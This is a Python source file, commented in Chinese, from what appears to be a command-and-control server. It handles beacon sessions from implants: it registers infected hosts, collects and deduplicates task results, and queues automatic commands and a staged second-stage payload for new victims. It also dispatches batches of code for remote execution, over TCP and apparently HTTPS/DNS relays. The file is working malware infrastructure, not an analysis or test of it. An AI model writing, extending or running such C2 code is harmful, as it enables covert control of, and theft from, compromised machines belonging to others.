"""Beacon 会话（v2 批量任务模型）。

流程: 握手（register/welcome，协议版本严格相等 + batch 标记强校验）→
implant 上报批量结果（RESULT ×N → FETCH）→ 服务端确认（acked）+ 一次性
下发全部 pending 任务（TASKS 帧，按字节预算分批）→ PONG → 断开。

批量语义:
- 结果: implant 本地执行完的任务结果在下次回连时带上;服务端按 task_id
  去重(implant 重发未获 ACK 的结果),确认信息随 TASKS 帧 acked 回执。
- 任务: 服务端 drain 队列一次性全部下发,implant 断开后本地每任务一线程
  执行,执行完的结果下次回连上报——服务端不再逐条等待(旧模型废弃)。

fire-and-forget 语义（10.2）: 结果收到就存,没收到(断连)则 implant 下次
重发,去重兜底。不追踪任务状态。

register / 结果落库 / auto_commands / 结果处理器 抽在 sessions/engine.py,
与 HTTPS/DNS 传输共用同一实现。
"""

import json

from server.core.protocol import (
    send_frame, recv_frame, validate_message, TASKS, RESULT, FETCH, PONG,
)
from server.core.events import (
    EVT_DISCONNECT, EVT_TASK_SENT, EVT_AUTO_CMD_SENT,
)
from server.core.log import get_logger
from .base import handshake, send_welcome, send_error, SessionError
from .engine import (
    register_beacon, store_result, build_auto_tasks,
    take_task_batch, batch_response, InFlight,
)

logger = get_logger("beacon_session")


class BeaconSession:
    """Beacon 连接会话（v2 批量模型）。"""

    def __init__(self, sock, key: bytes, expected_role: str,
                 mgr, tq, events, config, modules, smods, dispatcher=None):
        self._sock = sock
        self._key = key
        self._expected_role = expected_role
        self._mgr = mgr
        self._tq = tq
        self._events = events
        self._config = config
        self._modules = modules
        self._smods = smods
        self._dispatcher = dispatcher  # 结果处理器续传 + auto_commands 用
        self._client_id = ""           # 注册成功后填充（close 清 active 用）
        self._is_fork = False          # 注册时标记（跳过 auto_commands）
        # 本周期结束原因(R22):normal / peer_closed / invalid_message /
        # send_failed / replay_failed —— 离开时随 disconnect 事件一起记录
        self._end_reason = "normal"
        # 任务在途登记: task_id -> (result_processor, proc_arg)。
        # TCP 批量下发即出队,结果在**后续连接**回来——登记表必须跨会话
        # (server 级共享,挂在 mgr 上;与 HTTPS/DNS 无状态通道的 InFlight
        # 同机制,修复 priv_esc/sysinfo 结果处理器在 TCP 通道失效的问题)。
        inflight = getattr(mgr, "_inflight", None)
        if inflight is None:
            inflight = InFlight()
            mgr._inflight = inflight
        self._inflight = inflight

    def run(self) -> None:
        try:
            self._sock.settimeout(self._config.socket_timeout)
            reg = handshake(self._sock, self._key, self._expected_role,
                            self._config.max_frame_size)
            # v2: batch 标记强校验——旧植入物(无 batch)直接拒绝,不做向下兼容
            if reg.get("batch") is not True:
                raise SessionError("BAD_JSON", "v2 protocol requires batch=true")
            # 注册（含 via 标记）先于 welcome：welcome 语义 = 注册成功
            client_id, is_new = self._register(reg)
            self._client_id = client_id
            send_welcome(self._sock, self._key)
            try:
                self._task_cycle(client_id, is_new)
            finally:
                # R22:无论如何离开(正常跑完/收帧断开/非法消息/发送失败/回放失败)
                # 都记一笔 disconnect(带原因),且只记一次 —— 此前只有顺利跑完才记,
                # 事件文件里时间线是断的。未注册的连接不记(见 _emit_end)。
                self._emit_end()
        except SessionError as e:
            logger.warning("handshake failed: %s", e.message)
            send_error(self._sock, self._key, e.code, e.message)
        except (ConnectionError, ValueError):
            logger.debug("beacon connection closed")
        except Exception:
            logger.exception("beacon session error")

    def close(self) -> None:
        try:
            self._sock.close()
        except OSError:
            pass
        # 会话结束：活跃会话计数 -1(cleanup 竞态防护, B15——重叠会话的
        # close 只减自己的计数, 不再可能清掉其它活跃会话的标记)
        rec = self._mgr.get_client(self._client_id)
        if rec:
            rec.active = max(0, rec.active - 1)

    def _emit_end(self) -> None:
        """会话收尾:已注册才记 disconnect(带 R22 结束原因)。

        未注册成功的连接(端口扫描、握手失败)绝不能发这条事件 —— 否则事件流里
        会塞满探测垃圾;这也是收尾放在 _task_cycle 之后而非 run() 外层的原因。
        """
        if not self._client_id:
            return
        self._events.emit(EVT_DISCONNECT, self._client_id,
                          reason=self._end_reason)

    # ── 主流程 ──

    def _register(self, reg: dict) -> tuple:
        """注册 + via/fork/shell 标记 + 上线事件（共享引擎）。"""
        self._is_fork = bool(reg.get("fork", False))
        return register_beacon(reg, self._mgr, self._events)

    def _task_cycle(self, client_id: str, is_new: bool) -> None:
        """批量周期: 收结果 → auto 任务入队 → 一次性下发全部任务 → PONG。"""
        acked = []
        # ① 收批量结果（implant 逐条上报已执行完的结果,最后发 FETCH）
        while True:
            try:
                raw = recv_frame(self._sock, self._key,
                                 max_frame_size=self._config.max_frame_size)
            except (ConnectionError, ValueError):
                self._end_reason = "peer_closed"
                return  # 结果收到几条算几条（fire-and-forget,下次重发去重）
            result = json.loads(raw.decode("utf-8"))
            if validate_message(result):
                # R32:非 dict 载荷(如 `[]`)时原来这里直接 result.get("type") →
                # AttributeError 打死整个会话(外层 except 只留一行 traceback)。
                # validate_message 判非法是对的,是日志这行假设了 dict。
                mtype = result.get("type") if isinstance(result, dict) else type(result).__name__
                logger.warning("beacon %s sent invalid message: %s",
                               client_id[:8], mtype)
                self._end_reason = "invalid_message"
                return
            mtype = result.get("type")
            if mtype == RESULT:
                rp, pa = self._inflight.take(result.get("task_id", ""))
                store_result(client_id, result.get("task_id", ""),
                             result.get("output", ""), result.get("error", ""),
                             self._mgr, self._events,
                             self._config.max_result_size,
                             smods=self._smods, dispatcher=self._dispatcher,
                             result_processor=rp, proc_arg=pa,
                             overwrite=bool(result.get("overwrite", False)))
                acked.append(result.get("task_id", ""))
                # 逐条确认帧: implant 发一帧收一帧(TCP/HTTPS/DNS 统一),
                # 未收到确认的结果下次回连重发(服务端 task_id 去重)
                try:
                    send_frame(self._sock,
                               json.dumps({"type": TASKS, "tasks": [],
                                           "acked": [result.get("task_id", "")]})
                               .encode("utf-8"), self._key)
                except Exception:
                    self._end_reason = "send_failed"
                    return
            elif mtype == FETCH:
                break  # 结果收完,开始下发
            else:
                logger.warning("beacon %s sent non-result during batch: %s",
                               client_id[:8], mtype)
                self._end_reason = "invalid_message"
                return

        # ② 首次上线自动命令。
        #    - 无分段载荷:is_new 时全量入队(随批量一起下发,FIFO 在前)。
        #    - 有分段载荷(stage_code):**只下发第二段 init 任务**,auto_commands
        #      延后到真身(第二段执行后)上线时的第一次注册补发——引导段代码
        #      只 exec init 任务,同批的其它任务会被直接丢弃,且真身以同 id 再
        #      注册时 is_new=False,永不补发(2026-09-15 修复)。
        if not self._is_fork:
            rec = self._mgr.get_client(client_id)
            if is_new:
                if self._config.stage_code:
                    from server.task_queue import Task
                    self._tq.push(client_id, Task(
                        code=self._config.stage_code, is_init=True,
                        task_id="stage"))
                    self._events.emit(EVT_AUTO_CMD_SENT, client_id,
                                      task_id="stage")
                    if rec is not None:
                        rec.auto_pending = True   # 待真身上线补发
                else:
                    for task in build_auto_tasks(self._config.auto_commands,
                                                 client_id, self._dispatcher):
                        self._tq.push(client_id, task)
                        self._events.emit(EVT_AUTO_CMD_SENT, client_id,
                                          task_id=task.task_id)
            elif rec is not None and getattr(rec, "auto_pending", False):
                # 真身已上线(第二段执行完成):补发首次上线自动命令
                rec.auto_pending = False
                for task in build_auto_tasks(self._config.auto_commands,
                                             client_id, self._dispatcher):
                    self._tq.push(client_id, task)
                    self._events.emit(EVT_AUTO_CMD_SENT, client_id,
                                      task_id=task.task_id)

        # ③ 每次会话只取一批(单帧字节预算),剩余任务留在队列、下次回连再取。
        # 旧实现 drain 全量 + 拆多帧:无状态中继(agent_http/https/dns 的
        # relay_tx 每请求只读一帧就断连)第 2 帧起全部静默丢失;TCP 中途断线
        # 也只回放失败帧、后续帧已出队无人回放(2026-08-27 实测丢任务)。
        # 单批必单帧:中继通道一轮一帧正好,队列剩余下次轮询拉取。
        budget = max(4096, int(self._config.max_frame_size * 0.8))
        tasks = take_task_batch(client_id, self._tq, budget)
        if tasks:
            frame = batch_response(acked, tasks, budget)[0]  # 单批 → 单帧
            try:
                send_frame(self._sock,
                           json.dumps({"type": TASKS, **frame}).encode("utf-8"),
                           self._key)
            except Exception:
                # 断线: 本批逆序 push_front 回放原 Task(保留 result_processor/
                # proc_arg/is_init/record 标记),下次回连重发。
                # B15 防御: 单任务超过帧上限(用户调小 max_frame_size 且任务
                # code 超限)时回放只会反复取-发-断死循环——丢弃并记 error;
                # push_front 返回 False(队列满)同样不能静默丢
                for t in reversed(tasks):
                    approx = (len(getattr(t, "task_id", ""))
                              + len(getattr(t, "code", "")) + 64)
                    if approx > budget:
                        logger.error(
                            "task %s (~%dB) 超过帧预算 %dB, 无法传输, 丢弃"
                            "(请调大 max_frame_size 或减小任务体积)",
                            getattr(t, "task_id", "?")[:8], approx, budget)
                        continue
                    if not self._tq.push_front(client_id, t):
                        logger.error(
                            "task %s 回放入队失败(队列满), 任务将丢失——"
                            "请等待 beacon 消化后重新下发", 
                            getattr(t, "task_id", "?")[:8])
                self._end_reason = "replay_failed"
                return
            # R22:登记在途必须发生在"真的发出去"之后 —— 此前先登记再发送,
            # 发送失败走回放分支时登记没撤,留下"其实没交出去"的幽灵记录
            # (beacon 超时清理会兜底清掉,但语义不对)
            for t in tasks:
                self._inflight.track(t, client_id)
            for t in tasks:
                self._events.emit(EVT_TASK_SENT, client_id, task_id=t.task_id)
            # shell 文本任务 exit/break 已确认下发: 立即复位 is_shell,
            # 消除退出后到下次基础注册之间的误路由窗口
            if any(t.code.strip() in ("exit", "break") for t in tasks):
                rec = self._mgr.get_client(client_id)
                if rec is not None:
                    rec.is_shell = False
        else:
            # 无任务: 仍要发一帧空 TASKS 作为结果确认回执(acked)
            try:
                send_frame(self._sock,
                           json.dumps({"type": TASKS, "tasks": [],
                                       "acked": list(acked)}).encode("utf-8"),
                           self._key)
            except Exception:
                self._end_reason = "send_failed"
                return

        # ④ 结束本周期（implant 断开,本地执行任务）
        try:
            send_frame(self._sock,
                       json.dumps({"type": PONG}).encode("utf-8"), self._key)
        except Exception:
            pass
        # disconnect 由 run() 的 finally 统一发出(带 reason),这里不再重复发
